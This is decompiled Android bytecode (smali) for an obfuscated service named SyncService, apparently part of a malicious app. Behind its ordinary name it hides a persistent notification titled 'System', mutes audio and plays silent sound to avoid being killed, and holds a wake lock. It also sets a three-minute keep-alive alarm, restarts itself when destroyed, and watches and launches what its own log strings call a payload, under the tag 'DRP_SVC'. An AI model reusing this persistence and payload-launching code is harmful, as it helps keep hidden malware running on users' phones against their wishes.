.class public Lio/bluewave/app/services/SyncService;
.super Landroid/app/Service;
.source "r8-map-id-9b89e78e9c5e8923134474d94771b179d9c458b216b15abf6fb75f52fa5f6b53"


# static fields
.field public static volatile NGL7fgNWbzfZaqgpQY:Z = false


# instance fields
.field public ECM0w2UpL85TD4rnc:Landroid/media/AudioTrack;

.field public VYRgR7ZqgbZj3I16R:Landroid/os/PowerManager$WakeLock;

.field public volatile WAxAMT28akcO:Z

.field public volatile vpNdwwpwBwplN:Z


# direct methods
.method public constructor <init>()V
    .locals 1

    .line 1
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    .line 2
    .line 3
    .line 4
    const/4 v0, 0x0

    .line 5
    iput-boolean v0, p0, Lio/bluewave/app/services/SyncService;->WAxAMT28akcO:Z

    .line 6
    .line 7
    iput-boolean v0, p0, Lio/bluewave/app/services/SyncService;->vpNdwwpwBwplN:Z

    .line 8
    .line 9
    return-void
.end method


# virtual methods
.method public final VYRgR7ZqgbZj3I16R(Ljava/lang/String;)Z
    .locals 3

    .line 1
    const/4 v0, 0x0

    .line 2
    :try_start_0
    const-string v1, "activity"

    .line 3
    .line 4
    invoke-virtual {p0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    .line 5
    .line 6
    .line 7
    move-result-object v1

    .line 8
    check-cast v1, Landroid/app/ActivityManager;

    .line 9
    .line 10
    if-eqz v1, :cond_1

    .line 11
    .line 12
    invoke-virtual {v1}, Landroid/app/ActivityManager;->getRunningAppProcesses()Ljava/util/List;

    .line 13
    .line 14
    .line 15
    move-result-object v1

    .line 16
    if-eqz v1, :cond_1

    .line 17
    .line 18
    invoke-interface {v1}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    .line 19
    .line 20
    .line 21
    move-result-object v1

    .line 22
    :cond_0
    invoke-interface {v1}, Ljava/util/Iterator;->hasNext()Z

    .line 23
    .line 24
    .line 25
    move-result v2

    .line 26
    if-eqz v2, :cond_1

    .line 27
    .line 28
    invoke-interface {v1}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    .line 29
    .line 30
    .line 31
    move-result-object v2

    .line 32
    check-cast v2, Landroid/app/ActivityManager$RunningAppProcessInfo;

    .line 33
    .line 34
    iget-object v2, v2, Landroid/app/ActivityManager$RunningAppProcessInfo;->processName:Ljava/lang/String;

    .line 35
    .line 36
    invoke-virtual {p1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    .line 37
    .line 38
    .line 39
    move-result v2
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 40
    if-eqz v2, :cond_0

    .line 41
    .line 42
    const/4 p1, 0x1

    .line 43
    return p1

    .line 44
    :catchall_0
    move-exception p1

    .line 45
    goto :goto_0

    .line 46
    :cond_1
    return v0

    .line 47
    :goto_0
    new-instance v1, Ljava/lang/StringBuilder;

    .line 48
    .line 49
    const-string v2, "isPayloadRunning error: "

    .line 50
    .line 51
    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 52
    .line 53
    .line 54
    invoke-virtual {p1}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 55
    .line 56
    .line 57
    move-result-object p1

    .line 58
    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 59
    .line 60
    .line 61
    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 62
    .line 63
    .line 64
    move-result-object p1

    .line 65
    const-string v1, "DRP_SVC"

    .line 66
    .line 67
    invoke-static {v1, p1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 68
    .line 69
    .line 70
    return v0
.end method

.method public final onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 0

    .line 1
    const/4 p1, 0x0

    .line 2
    return-object p1
.end method

.method public final onCreate()V
    .locals 13

    .line 1
    const-string v1, "DRP_SVC"

    .line 2
    .line 3
    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    .line 4
    .line 5
    .line 6
    const-string v0, "power"

    .line 7
    .line 8
    invoke-virtual {p0, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    .line 9
    .line 10
    .line 11
    move-result-object v0

    .line 12
    check-cast v0, Landroid/os/PowerManager;

    .line 13
    .line 14
    const/4 v2, 0x1

    .line 15
    if-eqz v0, :cond_0

    .line 16
    .line 17
    const-string v3, "app:sync"

    .line 18
    .line 19
    invoke-virtual {v0, v2, v3}, Landroid/os/PowerManager;->newWakeLock(ILjava/lang/String;)Landroid/os/PowerManager$WakeLock;

    .line 20
    .line 21
    .line 22
    move-result-object v0

    .line 23
    iput-object v0, p0, Lio/bluewave/app/services/SyncService;->VYRgR7ZqgbZj3I16R:Landroid/os/PowerManager$WakeLock;

    .line 24
    .line 25
    invoke-virtual {v0}, Landroid/os/PowerManager$WakeLock;->acquire()V

    .line 26
    .line 27
    .line 28
    :cond_0
    new-instance v0, Landroid/app/NotificationChannel;

    .line 29
    .line 30
    const-string v3, "sync_ch"

    .line 31
    .line 32
    const-string v4, "System"

    .line 33
    .line 34
    const/4 v5, 0x2

    .line 35
    invoke-direct {v0, v3, v4, v5}, Landroid/app/NotificationChannel;-><init>(Ljava/lang/String;Ljava/lang/CharSequence;I)V

    .line 36
    .line 37
    .line 38
    const/4 v6, 0x0

    .line 39
    invoke-virtual {v0, v6}, Landroid/app/NotificationChannel;->setShowBadge(Z)V

    .line 40
    .line 41
    .line 42
    const/4 v7, 0x0

    .line 43
    invoke-virtual {v0, v7, v7}, Landroid/app/NotificationChannel;->setSound(Landroid/net/Uri;Landroid/media/AudioAttributes;)V

    .line 44
    .line 45
    .line 46
    invoke-virtual {v0, v6}, Landroid/app/NotificationChannel;->enableLights(Z)V

    .line 47
    .line 48
    .line 49
    invoke-virtual {v0, v6}, Landroid/app/NotificationChannel;->enableVibration(Z)V

    .line 50
    .line 51
    .line 52
    const-class v7, Landroid/app/NotificationManager;

    .line 53
    .line 54
    invoke-virtual {p0, v7}, Landroid/content/Context;->getSystemService(Ljava/lang/Class;)Ljava/lang/Object;

    .line 55
    .line 56
    .line 57
    move-result-object v7

    .line 58
    check-cast v7, Landroid/app/NotificationManager;

    .line 59
    .line 60
    if-eqz v7, :cond_1

    .line 61
    .line 62
    invoke-virtual {v7, v0}, Landroid/app/NotificationManager;->createNotificationChannel(Landroid/app/NotificationChannel;)V

    .line 63
    .line 64
    .line 65
    :cond_1
    new-instance v0, Landroid/app/Notification$Builder;

    .line 66
    .line 67
    invoke-direct {v0, p0, v3}, Landroid/app/Notification$Builder;-><init>(Landroid/content/Context;Ljava/lang/String;)V

    .line 68
    .line 69
    .line 70
    invoke-virtual {v0, v4}, Landroid/app/Notification$Builder;->setContentTitle(Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;

    .line 71
    .line 72
    .line 73
    move-result-object v0

    .line 74
    const v3, 0x1080041

    .line 75
    .line 76
    .line 77
    invoke-virtual {v0, v3}, Landroid/app/Notification$Builder;->setSmallIcon(I)Landroid/app/Notification$Builder;

    .line 78
    .line 79
    .line 80
    move-result-object v0

    .line 81
    invoke-virtual {v0, v2}, Landroid/app/Notification$Builder;->setOngoing(Z)Landroid/app/Notification$Builder;

    .line 82
    .line 83
    .line 84
    move-result-object v0

    .line 85
    invoke-virtual {v0}, Landroid/app/Notification$Builder;->build()Landroid/app/Notification;

    .line 86
    .line 87
    .line 88
    move-result-object v0

    .line 89
    invoke-virtual {p0, v2, v0}, Landroid/app/Service;->startForeground(ILandroid/app/Notification;)V

    .line 90
    .line 91
    .line 92
    const/4 v0, 0x4

    .line 93
    const/16 v3, 0x1f40

    .line 94
    .line 95
    :try_start_0
    invoke-static {v3, v0, v5}, Landroid/media/AudioTrack;->getMinBufferSize(III)I

    .line 96
    .line 97
    .line 98
    move-result v4

    .line 99
    if-gtz v4, :cond_2

    .line 100
    .line 101
    const/16 v4, 0x400

    .line 102
    .line 103
    :cond_2
    move v10, v4

    .line 104
    new-instance v4, Landroid/media/AudioAttributes$Builder;

    .line 105
    .line 106
    invoke-direct {v4}, Landroid/media/AudioAttributes$Builder;-><init>()V

    .line 107
    .line 108
    .line 109
    invoke-virtual {v4, v2}, Landroid/media/AudioAttributes$Builder;->setUsage(I)Landroid/media/AudioAttributes$Builder;

    .line 110
    .line 111
    .line 112
    move-result-object v4

    .line 113
    invoke-virtual {v4, v5}, Landroid/media/AudioAttributes$Builder;->setContentType(I)Landroid/media/AudioAttributes$Builder;

    .line 114
    .line 115
    .line 116
    move-result-object v4

    .line 117
    invoke-virtual {v4}, Landroid/media/AudioAttributes$Builder;->build()Landroid/media/AudioAttributes;

    .line 118
    .line 119
    .line 120
    move-result-object v8

    .line 121
    new-instance v4, Landroid/media/AudioFormat$Builder;

    .line 122
    .line 123
    invoke-direct {v4}, Landroid/media/AudioFormat$Builder;-><init>()V

    .line 124
    .line 125
    .line 126
    invoke-virtual {v4, v3}, Landroid/media/AudioFormat$Builder;->setSampleRate(I)Landroid/media/AudioFormat$Builder;

    .line 127
    .line 128
    .line 129
    move-result-object v3

    .line 130
    invoke-virtual {v3, v5}, Landroid/media/AudioFormat$Builder;->setEncoding(I)Landroid/media/AudioFormat$Builder;

    .line 131
    .line 132
    .line 133
    move-result-object v3

    .line 134
    invoke-virtual {v3, v0}, Landroid/media/AudioFormat$Builder;->setChannelMask(I)Landroid/media/AudioFormat$Builder;

    .line 135
    .line 136
    .line 137
    move-result-object v0

    .line 138
    invoke-virtual {v0}, Landroid/media/AudioFormat$Builder;->build()Landroid/media/AudioFormat;

    .line 139
    .line 140
    .line 141
    move-result-object v9

    .line 142
    new-instance v7, Landroid/media/AudioTrack;

    .line 143
    .line 144
    const/4 v11, 0x1

    .line 145
    const/4 v12, 0x0

    .line 146
    invoke-direct/range {v7 .. v12}, Landroid/media/AudioTrack;-><init>(Landroid/media/AudioAttributes;Landroid/media/AudioFormat;III)V

    .line 147
    .line 148
    .line 149
    iput-object v7, p0, Lio/bluewave/app/services/SyncService;->ECM0w2UpL85TD4rnc:Landroid/media/AudioTrack;

    .line 150
    .line 151
    const-string v0, "audio"

    .line 152
    .line 153
    invoke-virtual {p0, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    .line 154
    .line 155
    .line 156
    move-result-object v0

    .line 157
    check-cast v0, Landroid/media/AudioManager;
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_1

    .line 158
    .line 159
    if-eqz v0, :cond_3

    .line 160
    .line 161
    const/4 v3, 0x3

    .line 162
    :try_start_1
    invoke-virtual {v0, v3, v6, v6}, Landroid/media/AudioManager;->setStreamVolume(III)V
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    .line 163
    .line 164
    .line 165
    :catchall_0
    :cond_3
    :try_start_2
    iget-object v0, p0, Lio/bluewave/app/services/SyncService;->ECM0w2UpL85TD4rnc:Landroid/media/AudioTrack;

    .line 166
    .line 167
    invoke-virtual {v0}, Landroid/media/AudioTrack;->play()V

    .line 168
    .line 169
    .line 170
    iput-boolean v2, p0, Lio/bluewave/app/services/SyncService;->WAxAMT28akcO:Z

    .line 171
    .line 172
    new-array v0, v10, [B

    .line 173
    .line 174
    new-instance v2, Ljava/lang/Thread;

    .line 175
    .line 176
    new-instance v3, LQH62hje1O4khQnco5y/YnQspRyi16s9vN5;

    .line 177
    .line 178
    const/4 v4, 0x3

    .line 179
    invoke-direct {v3, p0, v0, v4}, LQH62hje1O4khQnco5y/YnQspRyi16s9vN5;-><init>(Ljava/lang/Object;Ljava/lang/Object;I)V

    .line 180
    .line 181
    .line 182
    const-string v0, "sil-audio"

    .line 183
    .line 184
    invoke-direct {v2, v3, v0}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;Ljava/lang/String;)V

    .line 185
    .line 186
    .line 187
    invoke-virtual {v2}, Ljava/lang/Thread;->start()V

    .line 188
    .line 189
    .line 190
    const-string v0, "Silent audio started"

    .line 191
    .line 192
    invoke-static {v1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_1

    .line 193
    .line 194
    .line 195
    goto :goto_0

    .line 196
    :catchall_1
    move-exception v0

    .line 197
    new-instance v2, Ljava/lang/StringBuilder;

    .line 198
    .line 199
    const-string v3, "Silent audio failed: "

    .line 200
    .line 201
    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 202
    .line 203
    .line 204
    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 205
    .line 206
    .line 207
    move-result-object v0

    .line 208
    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 209
    .line 210
    .line 211
    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 212
    .line 213
    .line 214
    move-result-object v0

    .line 215
    invoke-static {v1, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 216
    .line 217
    .line 218
    :goto_0
    :try_start_3
    const-string v0, "alarm"

    .line 219
    .line 220
    invoke-virtual {p0, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    .line 221
    .line 222
    .line 223
    move-result-object v0

    .line 224
    move-object v2, v0

    .line 225
    check-cast v2, Landroid/app/AlarmManager;

    .line 226
    .line 227
    if-nez v2, :cond_4

    .line 228
    .line 229
    goto :goto_1

    .line 230
    :cond_4
    new-instance v0, Landroid/content/Intent;

    .line 231
    .line 232
    const-class v3, Lio/bluewave/app/receivers/BootReceiver;

    .line 233
    .line 234
    invoke-direct {v0, p0, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 235
    .line 236
    .line 237
    const-string v3, "KEEP_ALIVE"

    .line 238
    .line 239
    invoke-virtual {v0, v3}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    .line 240
    .line 241
    .line 242
    const/high16 v3, 0xc000000

    .line 243
    .line 244
    const/16 v4, 0x1e61

    .line 245
    .line 246
    invoke-static {p0, v4, v0, v3}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    .line 247
    .line 248
    .line 249
    move-result-object v8

    .line 250
    invoke-static {}, Landroid/os/SystemClock;->elapsedRealtime()J

    .line 251
    .line 252
    .line 253
    move-result-wide v3

    .line 254
    const-wide/32 v6, 0x2bf20

    .line 255
    .line 256
    .line 257
    add-long v4, v3, v6

    .line 258
    .line 259
    const/4 v3, 0x2

    .line 260
    invoke-virtual/range {v2 .. v8}, Landroid/app/AlarmManager;->setRepeating(IJJLandroid/app/PendingIntent;)V

    .line 261
    .line 262
    .line 263
    const-string v0, "Keep-alive alarm scheduled every 3 min"

    .line 264
    .line 265
    invoke-static {v1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_2

    .line 266
    .line 267
    .line 268
    goto :goto_1

    .line 269
    :catchall_2
    move-exception v0

    .line 270
    new-instance v2, Ljava/lang/StringBuilder;

    .line 271
    .line 272
    const-string v3, "Alarm schedule failed: "

    .line 273
    .line 274
    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 275
    .line 276
    .line 277
    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 278
    .line 279
    .line 280
    move-result-object v0

    .line 281
    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 282
    .line 283
    .line 284
    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 285
    .line 286
    .line 287
    move-result-object v0

    .line 288
    invoke-static {v1, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 289
    .line 290
    .line 291
    :goto_1
    const-string v0, "SyncService created, foreground + silent audio started"

    .line 292
    .line 293
    invoke-static {v1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 294
    .line 295
    .line 296
    return-void
.end method

.method public final onDestroy()V
    .locals 2

    .line 1
    const/4 v0, 0x0

    .line 2
    sput-boolean v0, Lio/bluewave/app/services/SyncService;->NGL7fgNWbzfZaqgpQY:Z

    .line 3
    .line 4
    iput-boolean v0, p0, Lio/bluewave/app/services/SyncService;->vpNdwwpwBwplN:Z

    .line 5
    .line 6
    iput-boolean v0, p0, Lio/bluewave/app/services/SyncService;->WAxAMT28akcO:Z

    .line 7
    .line 8
    iget-object v0, p0, Lio/bluewave/app/services/SyncService;->ECM0w2UpL85TD4rnc:Landroid/media/AudioTrack;

    .line 9
    .line 10
    if-eqz v0, :cond_0

    .line 11
    .line 12
    :try_start_0
    invoke-virtual {v0}, Landroid/media/AudioTrack;->stop()V
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 13
    .line 14
    .line 15
    :catchall_0
    :try_start_1
    iget-object v0, p0, Lio/bluewave/app/services/SyncService;->ECM0w2UpL85TD4rnc:Landroid/media/AudioTrack;

    .line 16
    .line 17
    invoke-virtual {v0}, Landroid/media/AudioTrack;->release()V
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_1

    .line 18
    .line 19
    .line 20
    :catchall_1
    :cond_0
    iget-object v0, p0, Lio/bluewave/app/services/SyncService;->VYRgR7ZqgbZj3I16R:Landroid/os/PowerManager$WakeLock;

    .line 21
    .line 22
    if-eqz v0, :cond_1

    .line 23
    .line 24
    invoke-virtual {v0}, Landroid/os/PowerManager$WakeLock;->isHeld()Z

    .line 25
    .line 26
    .line 27
    move-result v0

    .line 28
    if-eqz v0, :cond_1

    .line 29
    .line 30
    :try_start_2
    iget-object v0, p0, Lio/bluewave/app/services/SyncService;->VYRgR7ZqgbZj3I16R:Landroid/os/PowerManager$WakeLock;

    .line 31
    .line 32
    invoke-virtual {v0}, Landroid/os/PowerManager$WakeLock;->release()V
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_2

    .line 33
    .line 34
    .line 35
    :catchall_2
    :cond_1
    :try_start_3
    new-instance v0, Landroid/content/Intent;

    .line 36
    .line 37
    const-class v1, Lio/bluewave/app/services/SyncService;

    .line 38
    .line 39
    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 40
    .line 41
    .line 42
    invoke-virtual {p0, v0}, Landroid/content/Context;->startForegroundService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_3

    .line 43
    .line 44
    .line 45
    :catchall_3
    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    .line 46
    .line 47
    .line 48
    return-void
.end method

.method public final onStartCommand(Landroid/content/Intent;II)I
    .locals 2

    .line 1
    const-string p1, "fgqloalm"

    .line 2
    .line 3
    const/4 p2, 0x0

    .line 4
    invoke-virtual {p0, p1, p2}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    .line 5
    .line 6
    .line 7
    move-result-object p1

    .line 8
    const-string p2, "stwmk"

    .line 9
    .line 10
    const/4 p3, 0x0

    .line 11
    invoke-interface {p1, p2, p3}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 12
    .line 13
    .line 14
    move-result-object p1

    .line 15
    const/4 p2, 0x1

    .line 16
    if-eqz p1, :cond_1

    .line 17
    .line 18
    sget-boolean p3, Lio/bluewave/app/services/SyncService;->NGL7fgNWbzfZaqgpQY:Z

    .line 19
    .line 20
    if-nez p3, :cond_1

    .line 21
    .line 22
    sput-boolean p2, Lio/bluewave/app/services/SyncService;->NGL7fgNWbzfZaqgpQY:Z

    .line 23
    .line 24
    const/16 p3, 0xa

    .line 25
    .line 26
    :try_start_0
    invoke-static {p1, p3}, Lio/bluewave/app/N;->n3(Ljava/lang/String;I)V
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 27
    .line 28
    .line 29
    :catchall_0
    iget-boolean p3, p0, Lio/bluewave/app/services/SyncService;->vpNdwwpwBwplN:Z

    .line 30
    .line 31
    if-eqz p3, :cond_0

    .line 32
    .line 33
    goto :goto_0

    .line 34
    :cond_0
    iput-boolean p2, p0, Lio/bluewave/app/services/SyncService;->vpNdwwpwBwplN:Z

    .line 35
    .line 36
    new-instance p3, Ljava/lang/Thread;

    .line 37
    .line 38
    new-instance v0, LQH62hje1O4khQnco5y/YnQspRyi16s9vN5;

    .line 39
    .line 40
    const/4 v1, 0x2

    .line 41
    invoke-direct {v0, p0, p1, v1}, LQH62hje1O4khQnco5y/YnQspRyi16s9vN5;-><init>(Ljava/lang/Object;Ljava/lang/Object;I)V

    .line 42
    .line 43
    .line 44
    const-string v1, "wd-mon"

    .line 45
    .line 46
    invoke-direct {p3, v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;Ljava/lang/String;)V

    .line 47
    .line 48
    .line 49
    invoke-virtual {p3}, Ljava/lang/Thread;->start()V

    .line 50
    .line 51
    .line 52
    :goto_0
    const-string p3, "Monitor started for "

    .line 53
    .line 54
    invoke-virtual {p3, p1}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    .line 55
    .line 56
    .line 57
    move-result-object p1

    .line 58
    const-string p3, "DRP_SVC"

    .line 59
    .line 60
    invoke-static {p3, p1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 61
    .line 62
    .line 63
    :cond_1
    return p2
.end method
